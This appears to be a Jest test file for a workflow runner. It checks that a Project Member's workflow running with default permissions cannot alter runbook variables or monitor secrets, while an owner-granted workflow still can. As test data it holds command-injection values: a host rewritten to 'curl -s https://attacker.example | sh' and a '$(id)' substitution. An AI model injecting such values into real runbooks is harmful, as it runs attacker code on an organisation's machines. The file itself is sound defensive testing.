/*
 * A WORKFLOW A PROJECT MEMBER BUILT CANNOT CHANGE A RUNBOOK VARIABLE OR A
 * MONITOR SECRET, run by the workflow runner itself, end to end: the graph
 * as the Builder saves it, started the way Run Workflow starts it, run by
 * the real trigger and the real steps from the registry, with the props the
 * real workflow principal gives them and the real services behind them. Only
 * the database is not real: the project's runbook variables and monitor
 * secrets are held in memory.
 *
 * A Project Member may build a workflow, and it runs with the default
 * permissions - a Project Admin's, less what no step is lent
 * (WorkflowPrincipal). The member may not change runbook variables: a plain
 * one is filled into an admin's script as it is written, so rewriting the
 * host a script names into a command runs that command on the project's
 * machines the next time the runbook runs. Nor may they change who a secret
 * reaches. So the step that would is refused, the run says so, and nothing
 * is written.
 *
 * Legitimate workflows still work: a step that reads a variable still does,
 * and a workflow a Project Owner gave Project Owner to run as still rotates
 * a variable, as that person could.
 */

import User from "Common/Models/DatabaseModels/User";
import Workflow from "Common/Models/DatabaseModels/Workflow";
import WorkflowVariable from "Common/Models/DatabaseModels/WorkflowVariable";
import AccessTokenService from "Common/Server/Services/AccessTokenService";
import MonitorSecretService from "Common/Server/Services/MonitorSecretService";
import ProjectService from "Common/Server/Services/ProjectService";
import RunbookVariableService from "Common/Server/Services/RunbookVariableService";
import UserService from "Common/Server/Services/UserService";
import WorkflowLogService from "Common/Server/Services/WorkflowLogService";
import WorkflowService from "Common/Server/Services/WorkflowService";
import ProjectReferenceCheck from "Common/Server/Utils/Database/ProjectReferenceCheck";
import logger from "Common/Server/Utils/Logger";
import WorkflowPrincipal from "Common/Server/Utils/Workflow/WorkflowPrincipal";
import DatabaseCommonInteractionProps from "Common/Types/BaseDatabase/DatabaseCommonInteractionProps";
import { PlanType } from "Common/Types/Billing/SubscriptionPlan";
import Email from "Common/Types/Email";
import { JSONObject } from "Common/Types/JSON";
import MonitorSecretAccess from "Common/Types/Monitor/MonitorSecretAccess";
import Name from "Common/Types/Name";
import ObjectID from "Common/Types/ObjectID";
import Permission, { UserPermission } from "Common/Types/Permission";
import { ComponentType, NodeType } from "Common/Types/Workflow/Component";
import ComponentID from "Common/Types/Workflow/ComponentID";
import {
  WorkflowStepStatus,
  WorkflowStepTrace,
  WorkflowStepTraceEntry,
  parseTrace,
} from "Common/Types/Workflow/StepTrace";
import { getUnhandledStepFailureLogLine } from "Common/Types/Workflow/UnhandledStepFailure";
import { WorkflowRunAs } from "Common/Types/Workflow/WorkflowRunAs";
import WorkflowStatus from "Common/Types/Workflow/WorkflowStatus";
import {
  InMemoryTable,
  useInMemoryTable,
} from "Common/Tests/Server/TestingUtils/InMemoryRepository";
import RunWorkflow, {
  StorageMap,
} from "../../../FeatureSet/Workflow/Services/RunWorkflow";
import {
  afterEach,
  beforeEach,
  describe,
  expect,
  jest,
  test,
} from "@jest/globals";

const WORKFLOW_ID: ObjectID = new ObjectID(
  "5ec00000-0000-4000-8000-000000000001",
);
const WORKFLOW_LOG_ID: ObjectID = new ObjectID(
  "5ec00000-0000-4000-8000-000000000002",
);
const PROJECT_ID: ObjectID = new ObjectID(
  "5ec00000-0000-4000-8000-000000000003",
);
// The Project Member who built the workflow, and the Project Owner.
const MEMBER_ID: ObjectID = new ObjectID(
  "5ec00000-0000-4000-8000-0000000000a1",
);
const OWNER_ID: ObjectID = new ObjectID("5ec00000-0000-4000-8000-0000000000a2");
// The host a Project Admin's runbook signs in to, and the key it signs in with.
const HOST_VARIABLE_ID: string = "5ec00000-0000-4000-8000-0000000000b1";
const KEY_VARIABLE_ID: string = "5ec00000-0000-4000-8000-0000000000b2";
const DATABASE_RUNNER_ID: string = "5ec00000-0000-4000-8000-0000000000c1";
const OTHER_RUNNER_ID: string = "5ec00000-0000-4000-8000-0000000000c2";
// A payment provider's token, for the checkout monitor only.
const MONITOR_SECRET_ID: string = "5ec00000-0000-4000-8000-0000000000d1";
const CHECKOUT_MONITOR_ID: string = "5ec00000-0000-4000-8000-0000000000d2";

const HOST: string = "10.0.4.21";
const INJECTED: string = "10.0.4.21; curl -s https://attacker.example | sh";

const TRIGGER: string = "manual-1";
const STEP: string = "secret-step-1";
const AFTER: string = "log-1";

interface RecordedSpy {
  mock: { calls: Array<Array<unknown>> };
}

interface StepSpec {
  componentId: string;
  metadataId: string;
  componentType: ComponentType;
  args: JSONObject;
}

/*
 * The graph as the Builder saves it - nodes without their metadata - that
 * starts by hand, runs `step`, and goes on to a Log from the output named,
 * when one is.
 */
function graphOf(step: StepSpec, then?: "success" | "error"): JSONObject {
  const specs: Array<StepSpec> = [
    {
      componentId: TRIGGER,
      metadataId: ComponentID.Manual,
      componentType: ComponentType.Trigger,
      args: {},
    },
    step,
  ];
  const edges: Array<Array<string>> = [[TRIGGER, "success", STEP]];

  if (then) {
    specs.push({
      componentId: AFTER,
      metadataId: ComponentID.Log,
      componentType: ComponentType.Component,
      args: { value: `After the step, from its ${then} output` },
    });
    edges.push([STEP, then, AFTER]);
  }

  return JSON.parse(
    JSON.stringify({
      nodes: specs.map((spec: StepSpec): JSONObject => {
        return {
          id: `canvas-${spec.componentId}`,
          type: "node",
          position: { x: 0, y: 0 },
          data: {
            id: spec.componentId,
            internalId: `runner-${spec.componentId}`,
            nodeType: NodeType.Node,
            componentType: spec.componentType,
            metadataId: spec.metadataId,
            arguments: spec.args,
            returnValues: {},
          },
        };
      }),
      edges: edges.map((edge: Array<string>): JSONObject => {
        return {
          id: `${edge[0]}-${edge[1]}-${edge[2]}`,
          source: `canvas-${edge[0]}`,
          sourceHandle: edge[1]!,
          target: `canvas-${edge[2]}`,
          targetHandle: "in",
        };
      }),
    }),
  ) as JSONObject;
}

function stepOf(
  componentId: string,
  metadataId: string,
  args: JSONObject,
): StepSpec {
  return {
    componentId: componentId,
    metadataId: metadataId,
    componentType: ComponentType.Component,
    args: args,
  };
}

// "Update One Runbook Variable", as the Builder saves it.
function updateVariable(id: string, data: JSONObject): StepSpec {
  return stepOf(STEP, "runbook-variable-update-one", {
    query: { _id: id },
    data: data,
  });
}

interface RunResult {
  persisted: JSONObject;
  trace: WorkflowStepTrace;
  logs: string;
}

// The workflow as the member built it: what it runs as, and nothing else.
function theWorkflow(
  graph: JSONObject,
  setting?: { runAs: WorkflowRunAs; runAsGivenByUserId: ObjectID },
): Workflow {
  const workflow: Workflow = new Workflow();
  workflow.id = WORKFLOW_ID;
  workflow.projectId = PROJECT_ID;
  workflow.isEnabled = true;
  workflow.name = "Keep the database host current";
  workflow.createdByUserId = MEMBER_ID;
  workflow.graph = graph;

  if (setting) {
    workflow.runAs = setting.runAs;
    workflow.runAsGivenByUserId = setting.runAsGivenByUserId;
  }

  return workflow;
}

async function runWorkflow(workflow: Workflow): Promise<RunResult> {
  const runner: RunWorkflow = new RunWorkflow();

  jest
    .spyOn(
      WorkflowService as unknown as {
        findOneById: (query: unknown) => Promise<Workflow | null>;
      },
      "findOneById",
    )
    .mockResolvedValue(workflow);

  const updateLogSpy: RecordedSpy = jest
    .spyOn(
      WorkflowLogService as unknown as {
        updateColumnsByIdWithoutHooks: (update: unknown) => Promise<void>;
      },
      "updateColumnsByIdWithoutHooks",
    )
    .mockResolvedValue(undefined) as unknown as RecordedSpy;

  const storageMap: StorageMap = {
    local: { variables: {}, components: {} },
    global: { variables: {} },
  };

  jest.spyOn(runner, "getVariables").mockResolvedValue({
    storageMap: storageMap,
    variables: [] as Array<WorkflowVariable>,
  });

  await runner.runWorkflow({
    arguments: {},
    workflowId: WORKFLOW_ID,
    workflowLogId: WORKFLOW_LOG_ID,
    timeout: 30_000,
  });

  const calls: Array<Array<unknown>> = updateLogSpy.mock.calls;
  const persisted: JSONObject = (
    calls[calls.length - 1]?.[0] as { data: JSONObject }
  ).data;

  return {
    persisted: persisted,
    trace: parseTrace(persisted["stepTrace"] as never),
    logs: String(persisted["logs"] || ""),
  };
}

function ran(trace: WorkflowStepTrace): Array<string> {
  return trace.steps.map((step: WorkflowStepTraceEntry): string => {
    return step.componentId;
  });
}

function traceOf(
  trace: WorkflowStepTrace,
  componentId: string,
): WorkflowStepTraceEntry {
  return trace.steps.find((step: WorkflowStepTraceEntry): boolean => {
    return step.componentId === componentId;
  })!;
}

// The person who gave a workflow its permissions, as they are now.
function givenGiver(permissions: Array<Permission>): void {
  const user: User = new User();
  user.id = OWNER_ID;
  user.name = new Name("Jane Doe");
  user.email = new Email("jane@example.com");
  user.isBlocked = false;
  user.isDisabled = false;

  jest.spyOn(UserService, "findOneById").mockResolvedValue(user as never);
  jest
    .spyOn(
      AccessTokenService,
      "getDatabaseCommonInteractionPropsByUserAndProject",
    )
    .mockResolvedValue({
      userId: OWNER_ID,
      tenantId: PROJECT_ID,
      userTenantAccessPermission: {
        [PROJECT_ID.toString()]: {
          _type: "UserTenantAccessPermission",
          projectId: PROJECT_ID,
          permissions: permissions.map(
            (permission: Permission): UserPermission => {
              return {
                _type: "UserPermission",
                permission: permission,
                labelIds: [],
                isBlockPermission: false,
              };
            },
          ),
        },
      },
    } as DatabaseCommonInteractionProps as never);
}

/*
 * The refusal the run says, for `verb` on `records`, with the permission a
 * custom role the workflow ran as would need - as the run log writes it.
 */
function refusal(
  stepTitle: string,
  verb: string,
  records: string,
  permissionTitle: string,
): string {
  return `"${stepTitle}" was refused. Workflows that run with the default permissions don't change the project's secrets, where OneUptime sends them, or what its runbooks run, so this step can't ${verb} ${records}. To let this workflow do it, choose what it runs as in its Settings: Project Owner, or a custom role that has ${permissionTitle}.`;
}

let variables: InMemoryTable;
let monitorSecrets: InMemoryTable;
let principal: RecordedSpy;

beforeEach(() => {
  jest.spyOn(ProjectService, "isProjectBlocked").mockResolvedValue(false);
  jest.spyOn(ProjectService, "getCurrentPlan").mockResolvedValue({
    plan: PlanType.Enterprise,
    isSubscriptionUnpaid: false,
  } as never);
  jest.spyOn(logger, "error").mockImplementation((): void => {
    return undefined;
  });
  jest
    .spyOn(ProjectReferenceCheck, "validateCreate")
    .mockResolvedValue(undefined as never);

  // The real principal: what every step acts with, watched, never replaced.
  principal = jest.spyOn(
    WorkflowPrincipal,
    "getProps",
  ) as unknown as RecordedSpy;

  variables = useInMemoryTable(RunbookVariableService, [
    {
      _id: HOST_VARIABLE_ID,
      projectId: PROJECT_ID.toString(),
      name: "PROD_DB_HOST",
      isSecret: false,
      value: HOST,
      isAvailableToGlobalRunners: false,
    },
    {
      _id: KEY_VARIABLE_ID,
      projectId: PROJECT_ID.toString(),
      name: "PROD_DB_SSH_KEY",
      isSecret: true,
      secretValue: "-----BEGIN OPENSSH PRIVATE KEY-----",
      isAvailableToGlobalRunners: false,
      runners: [{ _id: DATABASE_RUNNER_ID }],
    },
  ]);

  monitorSecrets = useInMemoryTable(MonitorSecretService, [
    {
      _id: MONITOR_SECRET_ID,
      projectId: PROJECT_ID.toString(),
      name: "PAYMENTS_TOKEN",
      secretValue: "sk_live_payments",
      monitorAccess: MonitorSecretAccess.SpecificMonitors,
      monitors: [{ _id: CHECKOUT_MONITOR_ID }],
    },
  ]);
});

afterEach(() => {
  jest.restoreAllMocks();
});

// Every write a table was asked for.
function writesTo(table: InMemoryTable): number {
  return (
    table.updates.length +
    table.inserts.length +
    table.deletes.length +
    table.repository.save.mock.calls.length
  );
}

describe("a workflow a Project Member built, running with the default permissions", () => {
  test("cannot rewrite the host an admin's runbook signs in to into a command: the step is refused, the run says so, and the host stays", async () => {
    const result: RunResult = await runWorkflow(
      theWorkflow(
        graphOf(
          updateVariable(HOST_VARIABLE_ID, { value: INJECTED }),
          "success",
        ),
      ),
    );

    const expected: string = refusal(
      "Update One Runbook Variable",
      "change",
      "Runbook Variables",
      "Edit Runbook Variable",
    );

    // Nothing is connected to the step's Error output, so the run fails.
    expect(result.persisted["workflowStatus"]).toBe(WorkflowStatus.Error);
    expect(ran(result.trace)).toEqual([TRIGGER, STEP]);
    expect(traceOf(result.trace, STEP).status).toBe(WorkflowStepStatus.Error);
    expect(result.logs).toContain(expected);
    expect(result.logs).toContain(
      getUnhandledStepFailureLogLine([
        { componentId: STEP, title: "Update One Runbook Variable" },
      ]),
    );

    // The step acted as the workflow principal hands it, as no person.
    expect(principal.mock.calls.length).toBeGreaterThan(0);
    const options: { runAs?: { runAs?: WorkflowRunAs } } = principal.mock
      .calls[0]![0] as { runAs?: { runAs?: WorkflowRunAs } };
    expect(options.runAs?.runAs ?? WorkflowRunAs.Default).toBe(
      WorkflowRunAs.Default,
    );

    // Nothing was written: the runbook still signs in to its own host.
    expect(writesTo(variables)).toBe(0);
    expect(variables.get(HOST_VARIABLE_ID)?.["value"]).toBe(HOST);
  });

  test("takes the step's Error output when it is connected, as the templates do, and still writes nothing", async () => {
    const result: RunResult = await runWorkflow(
      theWorkflow(
        graphOf(updateVariable(HOST_VARIABLE_ID, { value: INJECTED }), "error"),
      ),
    );

    expect(result.persisted["workflowStatus"]).toBe(WorkflowStatus.Success);
    expect(ran(result.trace)).toEqual([TRIGGER, STEP, AFTER]);
    expect(traceOf(result.trace, STEP).status).toBe(WorkflowStepStatus.Error);
    expect(writesTo(variables)).toBe(0);
    expect(variables.get(HOST_VARIABLE_ID)?.["value"]).toBe(HOST);
  });

  test("cannot add a variable a runbook names, replace a secret, or hand it to another Runner", async () => {
    const steps: Array<{ step: StepSpec; title: string; verb: string }> = [
      {
        step: stepOf(STEP, "runbook-variable-create-one", {
          json: { name: "DEPLOY_TARGET", isSecret: false, value: "$(id)" },
        }),
        title: "Create One Runbook Variable",
        verb: "create",
      },
      {
        step: updateVariable(KEY_VARIABLE_ID, {
          secretValue: "-----BEGIN OPENSSH PRIVATE KEY----- attacker",
        }),
        title: "Update One Runbook Variable",
        verb: "change",
      },
      {
        step: updateVariable(KEY_VARIABLE_ID, {
          runners: [DATABASE_RUNNER_ID, OTHER_RUNNER_ID],
          isAvailableToGlobalRunners: true,
        }),
        title: "Update One Runbook Variable",
        verb: "change",
      },
      {
        step: stepOf(STEP, "runbook-variable-delete-one", {
          query: { _id: KEY_VARIABLE_ID },
        }),
        title: "Delete One Runbook Variable",
        verb: "delete",
      },
    ];

    for (const { step, title, verb } of steps) {
      const result: RunResult = await runWorkflow(
        theWorkflow(graphOf(step, "success")),
      );

      expect(result.persisted["workflowStatus"]).toBe(WorkflowStatus.Error);
      expect(result.logs).toContain(
        refusal(
          title,
          verb,
          "Runbook Variables",
          verb === "create"
            ? "Create Runbook Variable"
            : verb === "delete"
              ? "Delete Runbook Variable"
              : "Edit Runbook Variable",
        ),
      );
    }

    expect(writesTo(variables)).toBe(0);
    expect(variables.rows).toHaveLength(2);
    expect(variables.get(KEY_VARIABLE_ID)?.["runners"]).toEqual([
      { _id: DATABASE_RUNNER_ID },
    ]);
    expect(variables.get(KEY_VARIABLE_ID)?.["isAvailableToGlobalRunners"]).toBe(
      false,
    );
  });

  test("cannot widen a monitor secret to every monitor, its own among them", async () => {
    const result: RunResult = await runWorkflow(
      theWorkflow(
        graphOf(
          stepOf(STEP, "monitor-secret-update-one", {
            query: { _id: MONITOR_SECRET_ID },
            data: { monitorAccess: MonitorSecretAccess.AllMonitors },
          }),
          "success",
        ),
      ),
    );

    expect(result.persisted["workflowStatus"]).toBe(WorkflowStatus.Error);
    expect(result.logs).toContain(
      refusal(
        "Update One Monitor Secret",
        "change",
        "Monitor Secrets",
        "Edit Monitor Secret",
      ),
    );
    expect(writesTo(monitorSecrets)).toBe(0);
    expect(monitorSecrets.get(MONITOR_SECRET_ID)?.["monitorAccess"]).toBe(
      MonitorSecretAccess.SpecificMonitors,
    );
  });

  test("still reads a runbook variable, as before", async () => {
    const result: RunResult = await runWorkflow(
      theWorkflow(
        graphOf(
          stepOf(STEP, "runbook-variable-find-one", {
            query: { _id: HOST_VARIABLE_ID },
            select: { _id: true, name: true, value: true },
          }),
          "success",
        ),
      ),
    );

    expect(result.persisted["workflowStatus"]).toBe(WorkflowStatus.Success);
    expect(ran(result.trace)).toEqual([TRIGGER, STEP, AFTER]);
    expect(traceOf(result.trace, STEP).status).toBe(WorkflowStepStatus.Success);
    expect(writesTo(variables)).toBe(0);
  });
});

describe("a workflow that runs as Project Owner, given by a Project Owner", () => {
  test("still rotates the runbook variable, and the run says whose permissions it ran with", async () => {
    givenGiver([Permission.ProjectOwner]);

    const result: RunResult = await runWorkflow(
      theWorkflow(
        graphOf(
          updateVariable(HOST_VARIABLE_ID, { value: "10.0.4.22" }),
          "success",
        ),
        {
          runAs: WorkflowRunAs.ProjectOwner,
          runAsGivenByUserId: OWNER_ID,
        },
      ),
    );

    expect(result.persisted["workflowStatus"]).toBe(WorkflowStatus.Success);
    expect(ran(result.trace)).toEqual([TRIGGER, STEP, AFTER]);
    expect(result.logs).toContain(
      "Running as Project Owner, with the permissions Jane Doe gave this workflow.",
    );
    expect(variables.get(HOST_VARIABLE_ID)?.["value"]).toBe("10.0.4.22");
  });

  test("still gives a monitor secret to every monitor", async () => {
    givenGiver([Permission.ProjectOwner]);

    const result: RunResult = await runWorkflow(
      theWorkflow(
        graphOf(
          stepOf(STEP, "monitor-secret-update-one", {
            query: { _id: MONITOR_SECRET_ID },
            data: { monitorAccess: MonitorSecretAccess.AllMonitors },
          }),
          "success",
        ),
        {
          runAs: WorkflowRunAs.ProjectOwner,
          runAsGivenByUserId: OWNER_ID,
        },
      ),
    );

    expect(result.persisted["workflowStatus"]).toBe(WorkflowStatus.Success);
    expect(monitorSecrets.get(MONITOR_SECRET_ID)?.["monitorAccess"]).toBe(
      MonitorSecretAccess.AllMonitors,
    );
  });

  test("once its giver is no longer a Project Owner, it does not run, and the variable stays", async () => {
    givenGiver([Permission.ProjectMember]);

    const result: RunResult = await runWorkflow(
      theWorkflow(
        graphOf(
          updateVariable(HOST_VARIABLE_ID, { value: INJECTED }),
          "success",
        ),
        {
          runAs: WorkflowRunAs.ProjectOwner,
          runAsGivenByUserId: OWNER_ID,
        },
      ),
    );

    expect(result.persisted["workflowStatus"]).toBe(WorkflowStatus.Error);
    expect(result.logs).toContain("Jane Doe is no longer a Project Owner");
    expect(writesTo(variables)).toBe(0);
    expect(variables.get(HOST_VARIABLE_ID)?.["value"]).toBe(HOST);
  });
});
